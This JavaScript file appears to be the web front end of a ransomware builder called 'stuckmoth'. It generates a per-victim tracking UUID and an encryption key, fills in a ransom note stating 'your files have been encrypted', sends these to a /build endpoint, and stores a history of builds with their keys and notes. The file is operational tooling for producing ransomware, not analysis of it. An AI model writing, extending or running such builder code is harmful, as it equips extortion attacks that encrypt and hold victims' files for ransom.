const genTracking = document.querySelector('.gen-tracking');
const genEncryption = document.querySelector('.gen-encryption');
const genNote = document.querySelector('.gen-note');
const build = document.querySelector('.build');

const tracking = document.querySelector('.tracking');
const encryption = document.querySelector('.encryption');
const note = document.querySelector('.note');

const seeHistory = document.querySelector('.history');
const backHistory = document.querySelector('.history-close');
const historyPage = document.querySelector('.history-page');
const historyList = document.querySelector('.history-builds');

const defaultNote = 'your files have been encrypted\n\nyour tracking id: <TRACKING_ID>';

let canBuild = true;

genTracking.addEventListener('click', () => {
    tracking.value = crypto.randomUUID();
});

genEncryption.addEventListener('click', () => {
    encryption.value = btoa(crypto.getRandomValues(new Uint8Array(10)))
        .toLowerCase()
        .replaceAll('=', '')
        .split('')
        .reverse()
        .join('')
        .slice(0, -3);
});

genNote.addEventListener('click', () => {
    note.value = defaultNote;
    localStorage.setItem('stuckmoth.note', note.value);
});

build.addEventListener('click', async () => {
    if (!canBuild) {
        return;
    }

    canBuild = false;

    if (tracking.value.trim() === '') {
        genTracking.click();
    }

    if (encryption.value.trim() === '') {
        genEncryption.click();
    }

    if (note.value.trim() === '') {
        genNote.click();
    }

    document.title = document.title + ' - building...';

    localStorage.setItem('stuckmoth.note', note.value);

    const history = localStorage.getItem('stuckmoth.builds');
    const historyData = JSON.parse(history || '[]');

    const data = {
        time: Date.now(),
        tracking: tracking.value,
        encryption: encryption.value,
        note: note.value
    };

    historyData.unshift(data);

    note.value = note.value.replaceAll('<TRACKING_ID>', tracking.value);

    const res = await fetch('/build', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ data: data })
    });

    if (!res.ok) {
        const text = await res.text();
        alert(`the request is not ok - ${text}`);

        window.location.href = window.location.pathname;
        return;
    }

    localStorage.setItem('stuckmoth.builds', JSON.stringify(historyData));

    window.location.href = window.location.pathname + `?buildsuc=${res.status === 200 ? 'yes' : 'no'}`;
});

seeHistory.addEventListener('click', () => {
    historyList.innerHTML = '';

    const history = localStorage.getItem('stuckmoth.builds');
    const historyData = JSON.parse(history || '[]');

    if (historyData.length === 0) {
        const nothing = document.createElement('p');
        nothing.textContent = 'No build history yet.';
        historyList.appendChild(nothing);
    } else {
        historyData.forEach((data, index) => {
            const item = document.createElement('div');
            item.className = 'history-item';

            const header = document.createElement('div');
            header.className = 'history-item-header';
            header.textContent = `${data.tracking} - ${new Date(data.time).toLocaleString()}`;

            const content = document.createElement('div');
            content.className = 'history-item-content';

            const encrpytion = document.createElement('div');
            const encrpytionText = document.createElement('strong');
            encrpytionText.textContent = 'encryption key: ';
            encrpytion.appendChild(encrpytionText);
            encrpytion.appendChild(document.createTextNode(data.encryption || '??'));

            const note = document.createElement('div');
            const noteText = document.createElement('strong');
            noteText.textContent = 'note: ';
            note.appendChild(noteText);
            note.appendChild(document.createTextNode(data.note || ''));

            content.appendChild(encrpytion);
            content.appendChild(note);

            item.appendChild(header);
            item.appendChild(content);

            historyList.appendChild(item);
        });
    }

    historyPage.classList.add('active');
});

backHistory.addEventListener('click', () => {
    historyPage.classList.remove('active');
});

(() => {
    const savedNote = localStorage.getItem('stuckmoth.note');
    if (!savedNote) {
        note.value = defaultNote;
        return;
    }

    note.value = savedNote;
})();